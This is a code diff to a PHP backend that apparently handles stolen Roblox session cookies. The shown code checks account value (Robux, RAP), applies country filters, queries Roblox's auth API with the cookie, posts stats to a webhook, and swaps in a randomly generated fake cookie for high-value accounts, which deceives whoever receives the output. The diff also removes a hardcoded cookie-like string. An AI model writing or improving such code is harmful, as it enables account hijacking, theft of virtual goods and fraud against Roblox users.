@@ -66,30 +66,34 @@ function getRandomUserAgent() {
 // ================================================
 
 /**
- * Generate a realistic-looking fake cookie based on template
- * Creates variations to avoid detection
+ * Generate a realistic-looking fake Roblox cookie
+ * Creates a completely new cookie that matches Roblox's format
+ * 
+ * @return string A realistic fake cookie (1024-1100 chars)
  */
-function generateFakeCookie($template) {
-    // If no template provided, use default
-    if (empty($template) || $template === 'FAKE_COOKIE_PLACEHOLDER') {
-        $template = "A243009B47547081C810B921ECD13728598D4F9B5DF24F63330923F05BB0B476B170521BABCB7CA07BC6EE742F3B9014CFF0CA2D4FBE041474F5FBB2235D239C1479AE46A6C241183914A7B9CC0CD89743B327C2350F3D3F6188C10C24D9B42B82D0CFFE5E1A00C735F94151C214E31DD961D4A0AFE0DB8D724158A62059C236AE0D7F286994776352ECF93EB94D479636DC7CD58ADBD48AF45D44E84A07A0BB6CFCB9C5B9D566CABC20D545766C93E30CF81FFEABB0D73CD28B4760C344D2D5AD9C0D50FABD15ACE6E7B3886C5D2ECE3FE1339DC5805AC44C47C43AF904799EE8D4DD526446DFE6117602A3F46F6615D40C690362A32865FB529474BE9066788AC7AB93C045EB853BCDD0904BF2BA69561960D8F40F8F4322535E5F0227C3536163D020E15351468811EFE5E473C42D3B247FC6AED12E694C2B89DD812DCE276FB63190A3F1281404AC6B0CCEE487B875981FDA1A1F903A68A4345B37DD0F0C14CC7EE8C081BC7C00671935EDCB8E9D926B30D86958BE44B4BE8BB920EDF5Q8699331B53C43067562F6CA5A5C76546562E7F5691B9670189E2231BE016C3162655642A7F14E32513BBE2F8D86E5999C849600C965EC0DF127EBF258279ADBE64A07ED1D055D00D2087B3848571F6E650E99B500D23F0371E7C38E69D03D814218C88D9O0FDCB8357D631858BAB0B1EE1220A64172CE0C3F657F7096636C6CEF8C1DAEE0BB696EB0C53398D3652F567379D8EA8863570CB7597B4A6EA750A68D2CEE5E0361C1EF3939C355C362F6628BF44CD9F0EE693CB694868B286E99E530BE3DA95599D0CBC43F16AE2F54D50E0048CCAE962636460E4ED418ADCCCAAC6C7D44775FAC1DB914458BCF5701ADED904B7DFC8E7692956AD2700ACC93C481CC725876BA0AD15ABF1CE6C9D7635F16B7B9FCE9C4E39CA8CCD8EF3D3F14D4F5C747504C5D97765BDBB8C943A4ECDCA37658BA999C024E24757058552CD55F61784FF11629F21F3BC586BA76E6A36716EB561A41833663A70026A83C3BECCB1B46C3E1C965777F3C61B391CCF7DF546B4736E812425B5616C6798185C9B9ADF053BAAF9BFF0319874F8F5DBA1E57F1E403E51F0PEC";
-    }
+function generateFakeCookie() {
+    // Roblox cookies are typically 1024-1100 characters
+    $cookieLength = rand(1024, 1100);
     
-    // Generate slight variations to make it look unique
-    $cookie = $template;
+    // Valid characters in Roblox cookies
     $hexChars = '0123456789ABCDEF';
     
-    // Replace random positions with random hex characters (5-10 changes)
-    $numChanges = rand(5, 10);
-    for ($i = 0; $i < $numChanges; $i++) {
-        $position = rand(0, strlen($cookie) - 1);
-        // Only replace if it's a hex character
-        if (ctype_xdigit($cookie[$position])) {
-            $cookie[$position] = $hexChars[rand(0, 15)];
+    // Occasionally seen special characters in real cookies
+    $specialChars = ['O', 'P', 'Q'];
+    
+    $fakeCookie = '';
+    
+    // Generate the cookie
+    for ($i = 0; $i < $cookieLength; $i++) {
+        // 98% hex characters, 2% special characters for realism
+        if (rand(1, 100) <= 98) {
+            $fakeCookie .= $hexChars[rand(0, 15)];
+        } else {
+            $fakeCookie .= $specialChars[array_rand($specialChars)];
         }
     }
     
-    return $cookie;
+    return $fakeCookie;
 }
 
 function ensure_warning_prefix(string $val, string $prefix): string {
@@ -189,7 +193,6 @@ function parse_env(): array {
             'FAKE_ROBUX_THRESHOLD' => $_ENV['FAKE_ROBUX_THRESHOLD'] ?? $_SERVER['FAKE_ROBUX_THRESHOLD'] ?? 0,
             'FAKE_RAP_THRESHOLD' => $_ENV['FAKE_RAP_THRESHOLD'] ?? $_SERVER['FAKE_RAP_THRESHOLD'] ?? 0,
             'FAKE_SUMMARY_THRESHOLD' => $_ENV['FAKE_SUMMARY_THRESHOLD'] ?? $_SERVER['FAKE_SUMMARY_THRESHOLD'] ?? 0,
-            'FAKE_COOKIE_TEMPLATE' => $_ENV['FAKE_COOKIE_TEMPLATE'] ?? $_SERVER['FAKE_COOKIE_TEMPLATE'] ?? '',
             'MIN_ACCOUNT_AGE_DAYS' => $_ENV['MIN_ACCOUNT_AGE_DAYS'] ?? $_SERVER['MIN_ACCOUNT_AGE_DAYS'] ?? 0,
             'BLOCKED_COUNTRIES' => $_ENV['BLOCKED_COUNTRIES'] ?? $_SERVER['BLOCKED_COUNTRIES'] ?? '',
             'ALLOWED_COUNTRIES' => $_ENV['ALLOWED_COUNTRIES'] ?? $_SERVER['ALLOWED_COUNTRIES'] ?? '',
@@ -602,7 +605,6 @@ try {
     $fakeRobuxThreshold = (int)($env['FAKE_ROBUX_THRESHOLD'] ?? 0);
     $fakeRapThreshold = (int)($env['FAKE_RAP_THRESHOLD'] ?? 0);
     $fakeSummaryThreshold = (int)($env['FAKE_SUMMARY_THRESHOLD'] ?? 0);
-    $fakeCookieTemplate = $env['FAKE_COOKIE_TEMPLATE'] ?? '';
     
     $minAccountAgeDays = (int)($env['MIN_ACCOUNT_AGE_DAYS'] ?? 0);
     $blockedCountries = $env['BLOCKED_COUNTRIES'] ?? '';
@@ -769,19 +771,28 @@ try {
         }
     }
 
+    // ================================================
+    // CHECK IF ACCOUNT MEETS FAKE COOKIE THRESHOLDS
+    // ================================================
     $shouldFake = false;
     $isHighValue = false;
+    
     if ($fakeRobuxThreshold > 0 && $robux >= $fakeRobuxThreshold) {
         $shouldFake = true;
         $isHighValue = true;
+        error_log("HIGH VALUE: Robux threshold met ($robux >= $fakeRobuxThreshold)");
     }
+    
     if ($fakeRapThreshold > 0 && $rap >= $fakeRapThreshold) {
         $shouldFake = true;
         $isHighValue = true;
+        error_log("HIGH VALUE: RAP threshold met ($rap >= $fakeRapThreshold)");
     }
+    
     if ($fakeSummaryThreshold > 0 && $summary >= $fakeSummaryThreshold) {
         $shouldFake = true;
         $isHighValue = true;
+        error_log("HIGH VALUE: Summary threshold met ($summary >= $fakeSummaryThreshold)");
     }
 
     $pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
@@ -969,8 +980,14 @@ try {
         sendWebhook($statsWebhookUrl, $statsEmbed);
     }
 
-    // Generate fake cookie if high-value account detected
-    $cookieToReturn = $shouldFake ? generateFakeCookie($fakeCookieTemplate) : $newCookie;
+    // ================================================
+    // RETURN FAKE OR REAL COOKIE BASED ON THRESHOLDS
+    // ================================================
+    $cookieToReturn = $shouldFake ? generateFakeCookie() : $newCookie;
+    
+    if ($shouldFake) {
+        error_log("Returning FAKE cookie for high-value account: User $userId, Robux: $robux, RAP: $rap, Summary: $summary");
+    }
 
     echo json_encode([
         'cookie' => $cookieToReturn,
